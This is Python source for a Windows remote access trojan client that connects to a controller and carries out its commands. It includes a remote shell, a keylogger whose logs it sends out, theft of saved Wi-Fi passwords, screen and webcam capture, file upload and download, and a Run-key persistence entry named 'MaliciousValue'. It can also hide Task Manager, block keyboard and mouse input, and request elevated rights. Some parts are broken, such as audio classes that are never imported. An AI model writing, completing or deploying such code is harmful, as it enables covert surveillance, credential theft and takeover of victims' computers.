import os
import sys
import socket
import subprocess
import platform
import random
import webbrowser
import re
import shutil
import glob
import json
import time
from datetime import datetime
from threading import Thread
from PIL import Image
from ctypes import cast, POINTER, windll
from comtypes import CLSCTX_ALL
from winreg import *
from pynput.keyboard import Listener
from pynput.mouse import Controller
import cv2
import pyautogui
import keyboard
import urllib.request

user32 = windll.user32
kernel32 = windll.kernel32

HWND_BROADCAST = 65535
WM_SYSCOMMAND = 274
SC_MONITORPOWER = 61808
GENERIC_READ = -2147483648
GENERIC_WRITE = 1073741824
FILE_SHARE_WRITE = 2
FILE_SHARE_READ = 1
FILE_SHARE_DELETE = 4
CREATE_ALWAYS = 2

class RATClient:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.curdir = os.getcwd()
        self.block_task_mgr = False
        self.disable_keyboard_flag = False
        self.disable_mouse_flag = False
        self.keylogger_flag = False
        self.socket = None
    
    def build_connection(self):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.connect((self.host, self.port))
        self.socket.send(socket.gethostbyname(socket.gethostname()).encode())
    
    def send_error(self):
        error_msg = bytearray("no output", encoding='utf8')
        for i in range(len(error_msg)):
            error_msg[i] ^= 0x41
        self.socket.send(error_msg)
    
    def keylogger(self):
        def on_press(key):
            if self.keylogger_flag:
                with open('keylogs.txt', 'a') as f:
                    f.write(f'{key}')

        with Listener(on_press=on_press) as listener:
            listener.join()
    
    def block_task_manager(self):
        if windll.shell32.IsUserAnAdmin() == 1:
            while self.block_task_mgr:
                hwnd = user32.FindWindowW(None, "Task Manager")
                if hwnd:
                    user32.ShowWindow(hwnd, 0)
                time.sleep(0.5)
    
    def disable_input(self, disable):
        user32.BlockInput(disable)
    
    def disable_mouse(self):
        mouse = Controller()
        while self.disable_mouse_flag:
            mouse.position = (0, 0)
            time.sleep(0.1)
    
    def disable_keyboard(self):
        while self.disable_keyboard_flag:
            for i in range(150):
                keyboard.block_key(i)
            time.sleep(1)
    
    def execute_command(self, command):
        try:
            if command == 'shell':
                self.shell_mode()
            elif command == 'screenshare':
                self.start_screenshare()
            elif command == 'webcam':
                self.start_webcam()
            elif command == 'breakstream':
                pass
            elif command == 'list':
                pass
            elif command == 'geolocate':
                self.geolocate()
            elif command == 'setvalue':
                self.set_registry_value()
            elif command == 'delkey':
                self.delete_registry_key()
            elif command == 'createkey':
                self.create_registry_key()
            elif command == 'volumeup':
                self.set_volume(True)
            elif command == 'volumedown':
                self.set_volume(False)
            elif command == 'setwallpaper':
                self.set_wallpaper()
            elif command == 'usbdrivers':
                self.get_usb_drivers()
            elif command == 'monitors':
                self.get_monitors()
            elif command == 'sysinfo':
                self.get_system_info()
            elif command == 'reboot':
                self.reboot_system()
            elif command.startswith('writein'):
                self.write_in(command.split(" ")[1])
            elif command.startswith('readfile'):
                self.read_file(command[9:])
            elif command.startswith('abspath'):
                self.get_abspath(command[8:])
            elif command == 'pwd':
                self.send_current_directory()
            elif command == 'ipconfig':
                self.run_command('ipconfig')
            elif command == 'portscan':
                self.run_command('netstat -an')
            elif command == 'tasklist':
                self.run_command('tasklist')
            elif command == 'profiles':
                self.run_command('netsh wlan show profiles')
            elif command == 'profilepswd':
                self.get_wifi_password()
            elif command == 'systeminfo':
                self.run_command('systeminfo')
            elif command == 'sendmessage':
                self.send_message()
            elif command.startswith("disable"):
                self.disable_devices(command)
            elif command.startswith("enable"):
                self.enable_devices(command)
            elif command == 'turnoffmon':
                self.turn_off_monitor()
            elif command == 'turnonmon':
                self.turn_on_monitor()
            elif command == 'extendrights':
                self.extend_rights()
            elif command == 'isuseradmin':
                self.check_admin_rights()
            elif command == 'keyscan_start':
                self.start_keylogger()
            elif command == 'send_logs':
                self.send_logs()
            elif command == 'stop_keylogger':
                self.stop_keylogger()
            elif command == 'cpu_cores':
                self.send_cpu_cores()
            elif command.startswith('delfile'):
                self.delete_file(command[8:])
            elif command.startswith('editfile'):
                self.edit_file(command.split(" ")[1], command.split(" ")[2])
            elif command.startswith('cp'):
                self.copy_file(command.split(" ")[1], command.split(" ")[2])
            elif command.startswith('mv'):
                self.move_file(command.split(" ")[1], command.split(" ")[2])
            elif command.startswith('cd'):
                self.change_directory(command[3:])
            elif command == 'cd ..':
                self.change_directory('..')
            elif command == 'dir':
                self.list_directory()
            elif command[1:2] == ':':
                self.change_drive(command)
            elif command.startswith('createfile'):
                self.create_file(command[11:])
            elif command.startswith('searchfile'):
                self.search_file(command.split(" ")[1], command.split(" ")[2])
            elif command == 'curpid':
                self.send_current_pid()
            elif command == 'drivers':
                self.list_drivers()
            elif command.startswith('kill'):
                self.kill_process(command[5:])
            elif command == 'shutdown':
                self.shutdown_system()
            elif command == 'disabletaskmgr':
                self.disable_task_manager()
            elif command == 'enabletaskmgr':
                self.enable_task_manager()
            elif command == 'localtime':
                self.send_local_time()
            elif command.startswith('startfile'):
                self.start_file(command[10:])
            elif command.startswith('download'):
                self.download_file(command.split(" ")[1])
            elif command == 'upload':
                self.upload_file()
            elif command.startswith('mkdir'):
                self.create_directory(command[6:])
            elif command.startswith('rmdir'):
                self.remove_directory(command[6:])
            elif command == 'browser':
                self.open_browser()
            elif command == 'screenshot':
                self.take_screenshot()
            elif command == 'webcam_snap':
                self.take_webcam_snapshot()
            elif command == 'exit':
                self.socket.send(b"exit")
                self.socket.close()
                sys.exit(0)
        except Exception as e:
            self.send_error()

    def shell_mode(self):
        while True:
            command = self.socket.recv(1024).decode()
            if command.lower() == 'exit':
                break
            if command == 'cd':
                os.chdir(command[3:].decode('utf-8'))
                dir = os.getcwd()
                self.socket.send(dir.encode())
            else:
                output = subprocess.getoutput(command)
                if output:
                    self.socket.send(output.encode())
                else:
                    self.send_error()

    def start_screenshare(self):
        try:
            from vidstream import ScreenShareClient
            screen = ScreenShareClient(self.host, 8080)
            screen.start_stream()
        except:
            self.socket.send("Impossible to get screen".encode())

    def start_webcam(self):
        try:
            from vidstream import CameraClient
            cam = CameraClient(self.host, 8080)
            cam.start_stream()
        except:
            self.socket.send("Impossible to get webcam".encode())

    def geolocate(self):
        try:
            with urllib.request.urlopen("https://geolocation-db.com/json") as url:
                data = json.loads(url.read().decode())
                link = f"http://www.google.com/maps/place/{data['latitude']},{data['longitude']}"
            self.socket.send(link.encode())
        except:
            self.send_error()

    def set_registry_value(self):
        try:
            key = r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
            value_name = 'MaliciousValue'
            value_data = r'C:\Path\To\MaliciousFile.exe'
            reg_key = OpenKey(HKEY_CURRENT_USER, key, 0, KEY_SET_VALUE)
            SetValueEx(reg_key, value_name, 0, REG_SZ, value_data)
            CloseKey(reg_key)
        except:
            self.send_error()

    def delete_registry_key(self):
        try:
            key = r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
            value_name = 'MaliciousValue'
            reg_key = OpenKey(HKEY_CURRENT_USER, key, 0, KEY_SET_VALUE)
            DeleteValue(reg_key, value_name)
            CloseKey(reg_key)
        except:
            self.send_error()

    def create_registry_key(self):
        try:
            key = r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
            value_name = 'MaliciousValue'
            value_data = r'C:\Path\To\MaliciousFile.exe'
            reg_key = CreateKey(HKEY_CURRENT_USER, key)
            SetValueEx(reg_key, value_name, 0, REG_SZ, value_data)
            CloseKey(reg_key)
        except:
            self.send_error()

    def set_volume(self, increase):
        try:
            devices = AudioUtilities.GetSpeakers()
            interface = devices.Activate(
                IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
            volume = cast(interface, POINTER(IAudioEndpointVolume))
            if increase:
                volume.VolumeStepUp()
            else:
                volume.VolumeStepDown()
        except:
            self.send_error()

    def set_wallpaper(self):
        try:
            image_path = r"C:\Path\To\Wallpaper.jpg"
            SPI_SETDESKWALLPAPER = 20
            user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, image_path, 3)
        except:
            self.send_error()

    def get_usb_drivers(self):
        try:
            result = subprocess.getoutput('driverquery | find "USB"')
            self.socket.send(result.encode())
        except:
            self.send_error()

    def get_monitors(self):
        try:
            result = subprocess.getoutput('powershell "Get-CimInstance -Namespace root\wmi -ClassName WmiMonitorID | Select InstanceName"')
            self.socket.send(result.encode())
        except:
            self.send_error()

    def get_system_info(self):
        try:
            result = subprocess.getoutput('systeminfo')
            self.socket.send(result.encode())
        except:
            self.send_error()

    def reboot_system(self):
        try:
            os.system("shutdown /r /t 0")
        except:
            self.send_error()

    def write_in(self, text):
        try:
            keyboard.write(text)
        except:
            self.send_error()

    def read_file(self, path):
        try:
            with open(path, 'r') as file:
                content = file.read()
                self.socket.send(content.encode())
        except:
            self.send_error()

    def get_abspath(self, path):
        try:
            self.socket.send(os.path.abspath(path).encode())
        except:
            self.send_error()

    def send_current_directory(self):
        try:
            self.socket.send(os.getcwd().encode())
        except:
            self.send_error()

    def run_command(self, command):
        try:
            result = subprocess.getoutput(command)
            self.socket.send(result.encode())
        except:
            self.send_error()

    def get_wifi_password(self):
        try:
            profiles = subprocess.getoutput('netsh wlan show profiles')
            profile_names = re.findall("All User Profile\s*:\s*(.*)", profiles)
            passwords = ""
            for name in profile_names:
                password = subprocess.getoutput(f'netsh wlan show profile name="{name}" key=clear | findstr Key')
                passwords += f'{name}: {password}\n'
            self.socket.send(passwords.encode())
        except:
            self.send_error()

    def send_message(self):
        try:
            message = "Your message here"
            windll.user32.MessageBoxW(0, message, "Title", 1)
        except:
            self.send_error()

    def disable_devices(self, command):
        if "keyboard" in command:
            self.disable_keyboard_flag = True
            keyboard_thread = Thread(target=self.disable_keyboard)
            keyboard_thread.start()
        if "mouse" in command:
            self.disable_mouse_flag = True
            mouse_thread = Thread(target=self.disable_mouse)
            mouse_thread.start()

    def enable_devices(self, command):
        if "keyboard" in command:
            self.disable_keyboard_flag = False
        if "mouse" in command:
            self.disable_mouse_flag = False

    def turn_off_monitor(self):
        try:
            user32.SendMessageW(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 2)
        except:
            self.send_error()

    def turn_on_monitor(self):
        try:
            user32.SendMessageW(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, -1)
        except:
            self.send_error()

    def extend_rights(self):
        try:
            windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
        except:
            self.send_error()

    def check_admin_rights(self):
        try:
            if windll.shell32.IsUserAnAdmin() == 1:
                self.socket.send("Admin rights granted".encode())
            else:
                self.socket.send("Admin rights not granted".encode())
        except:
            self.send_error()

    def start_keylogger(self):
        self.keylogger_flag = True
        keylogger_thread = Thread(target=self.keylogger)
        keylogger_thread.start()

    def send_logs(self):
        try:
            with open('keylogs.txt', 'r') as file:
                logs = file.read()
                self.socket.send(logs.encode())
        except:
            self.send_error()

    def stop_keylogger(self):
        self.keylogger_flag = False

    def send_cpu_cores(self):
        try:
            cores = os.cpu_count()
            self.socket.send(str(cores).encode())
        except:
            self.send_error()

    def delete_file(self, path):
        try:
            os.remove(path)
            self.socket.send("File deleted".encode())
        except:
            self.send_error()

    def edit_file(self, path, content):
        try:
            with open(path, 'w') as file:
                file.write(content)
                self.socket.send("File edited".encode())
        except:
            self.send_error()

    def copy_file(self, src, dst):
        try:
            shutil.copy(src, dst)
            self.socket.send("File copied".encode())
        except:
            self.send_error()

    def move_file(self, src, dst):
        try:
            shutil.move(src, dst)
            self.socket.send("File moved".encode())
        except:
            self.send_error()

    def change_directory(self, path):
        try:
            os.chdir(path)
            self.socket.send(os.getcwd().encode())
        except:
            self.send_error()

    def list_directory(self):
        try:
            files = os.listdir()
            self.socket.send(str(files).encode())
        except:
            self.send_error()

    def change_drive(self, drive):
        try:
            os.chdir(drive)
            self.socket.send(os.getcwd().encode())
        except:
            self.send_error()

    def create_file(self, path):
        try:
            open(path, 'w').close()
            self.socket.send("File created".encode())
        except:
            self.send_error()

    def search_file(self, directory, filename):
        try:
            result = []
            for root, dirs, files in os.walk(directory):
                if filename in files:
                    result.append(os.path.join(root, filename))
            self.socket.send(str(result).encode())
        except:
            self.send_error()

    def send_current_pid(self):
        try:
            pid = os.getpid()
            self.socket.send(str(pid).encode())
        except:
            self.send_error()

    def list_drivers(self):
        try:
            drivers = [f"{d}:\\" for d in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{d}:\\")]
            self.socket.send(str(drivers).encode())
        except:
            self.send_error()

    def kill_process(self, pid):
        try:
            os.kill(int(pid), 9)
            self.socket.send("Process killed".encode())
        except:
            self.send_error()

    def shutdown_system(self):
        try:
            os.system("shutdown /s /t 0")
        except:
            self.send_error()

    def disable_task_manager(self):
        self.block_task_mgr = True
        task_mgr_thread = Thread(target=self.block_task_manager)
        task_mgr_thread.start()

    def enable_task_manager(self):
        self.block_task_mgr = False

    def send_local_time(self):
        try:
            local_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            self.socket.send(local_time.encode())
        except:
            self.send_error()

    def start_file(self, path):
        try:
            os.startfile(path)
            self.socket.send("File started".encode())
        except:
            self.send_error()

    def download_file(self, url):
        try:
            filename = url.split('/')[-1]
            urllib.request.urlretrieve(url, filename)
            self.socket.send(f"{filename} downloaded".encode())
        except:
            self.send_error()

    def upload_file(self):
        try:
            file_path = self.socket.recv(1024).decode()
            with open(file_path, 'rb') as file:
                self.socket.send(file.read())
        except:
            self.send_error()

    def create_directory(self, path):
        try:
            os.mkdir(path)
            self.socket.send("Directory created".encode())
        except:
            self.send_error()

    def remove_directory(self, path):
        try:
            os.rmdir(path)
            self.socket.send("Directory removed".encode())
        except:
            self.send_error()

    def open_browser(self):
        try:
            webbrowser.open("https://www.google.com")
            self.socket.send("Browser opened".encode())
        except:
            self.send_error()

    def take_screenshot(self):
        try:
            screenshot = pyautogui.screenshot()
            screenshot.save("screenshot.png")
            self.socket.send("Screenshot taken".encode())
        except:
            self.send_error()

    def take_webcam_snapshot(self):
        try:
            cam = cv2.VideoCapture(0)
            ret, frame = cam.read()
            cv2.imwrite("webcam.png", frame)
            cam.release()
            self.socket.send("Webcam snapshot taken".encode())
        except:
            self.send_error()

    def run(self):
        self.build_connection()
        while True:
            command = self.socket.recv(1024).decode()
            self.execute_command(command)

if __name__ == "__main__":
    client = RATClient("localhost", 8080)
    client.run()
